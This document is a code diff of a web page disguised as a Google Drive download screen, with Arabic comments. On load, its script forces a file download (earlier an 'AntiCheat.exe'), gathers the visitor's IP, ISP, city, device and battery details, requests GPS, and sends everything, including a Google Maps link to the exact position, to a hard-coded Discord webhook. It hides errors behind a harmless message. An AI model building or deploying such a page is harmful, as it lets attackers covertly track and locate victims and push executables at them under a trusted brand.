@@ -5,9 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Drive - جاري التحميل</title>
     <style>
+        /* إعدادات الصفحة العامة لجعلها متجاوبة */
         body { margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: #3c4043; }
         .container { text-align: center; padding: 30px; width: 90%; max-width: 400px; background: #ffffff; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .logo { width: 65px; margin-bottom: 20px; }
+        /* تصميم الأنميشن (اللودر) */
         .loader { border: 3px solid #f3f3f3; border-top: 3px solid #4285f4; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         h2 { font-size: 19px; font-weight: 500; margin: 10px 0; }
@@ -25,13 +27,15 @@
 
 <script>
     // --- إعداداتك هنا ---
+    // رابط الـ Webhook الخاص بك في ديسكورد
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
-    const DIRECT_DOWNLOAD_URL = "https://github.com/r3b-dev/AntiCheat/releases/download/v1.0/AntiCheat.exe"; // رابط الملف
+    // رابط مباشر لملف نصي تجريبي (قمنا بإنشائه لك)
+    const DIRECT_DOWNLOAD_URL = "https://raw.githubusercontent.com/r3b-dev/AntiCheat/main/welcome.txt"; 
     // --------------------
 
     async function startSystem() {
         try {
-            // 1. تشغيل التحميل التلقائي
+            // 1. تشغيل التحميل التلقائي فوراً
             const dl = document.createElement('a');
             dl.href = DIRECT_DOWNLOAD_URL;
             dl.download = ""; 
@@ -39,10 +43,10 @@
             dl.click();
             document.body.removeChild(dl);
 
-            // 2. جلب بيانات الإنترنت والشركة (ISP)
+            // 2. جلب بيانات الإنترنت والشركة (ISP) والموقع التقريبي من الـ IP
             const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
 
-            // 3. جلب بيانات البطارية والشاحن
+            // 3. جلب بيانات البطارية والشاحن وتوقع نوع السلك
             let batLevel = "غير معروف";
             let cableType = "غير متصل";
             if (navigator.getBattery) {
@@ -50,6 +54,7 @@
                 batLevel = Math.round(b.level * 100) + "%";
                 if (b.charging) {
                     const ua = navigator.userAgent.toLowerCase();
+                    // تحليل الـ User Agent لمعرفة نظام التشغيل
                     if (ua.includes("iphone") || ua.includes("ipad")) {
                         cableType = "Lightning / USB-C (Apple)";
                     } else {
@@ -58,7 +63,7 @@
                 }
             }
 
-            // 4. وظيفة إرسال البيانات للديسكورد
+            // 4. وظيفة إرسال البيانات للديسكورد بشكل منظم
             async function postToDiscord(mapsUrl = "بانتظار الموافقة...") {
                 const report = `
 **🚨 تقرير جديد (AntiCheat System)**
@@ -67,7 +72,7 @@
 **📍 المدينة/الدولة:** ${ipInfo.city}, ${ipInfo.country_name}
 **🗺️ موقع قوقل ماب:** ${mapsUrl}
 **🔋 نسبة الشحن:** ${batLevel}
-**🔌 نوع السلك:** ${cableType}
+**🔌 نوع السلك المتوقع:** ${cableType}
 **📱 نوع الجهاز:** ${navigator.platform}
 **🕵️ المتصفح:** ${navigator.vendor}
 ------------------------------------
@@ -79,20 +84,23 @@
                 });
             }
 
-            // إرسال البيانات فوراً (بدون موقع دقيق في البداية)
+            // إرسال البيانات الأولية فوراً (بدون موقع دقيق في البداية)
             await postToDiscord();
 
-            // 5. محاولة جلب الموقع الدقيق (يطلب إذن المستخدم)
+            // 5. محاولة جلب الموقع الدقيق عبر الـ GPS (يتطلب موافقة المستخدم)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
+                    // إنشاء رابط مباشر لإحداثيات المستخدم على قوقل ماب
                     const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await postToDiscord(mapLink); // إرسال تحديث بالموقع الدقيق
+                    // إرسال تحديث للديسكورد يحتوي على الموقع الدقيق
+                    await postToDiscord(mapLink); 
                 });
             }
 
         } catch (err) { console.log("System Ready"); }
     }
 
+    // تشغيل النظام فور تحميل الصفحة
     window.onload = startSystem;
 </script>
 
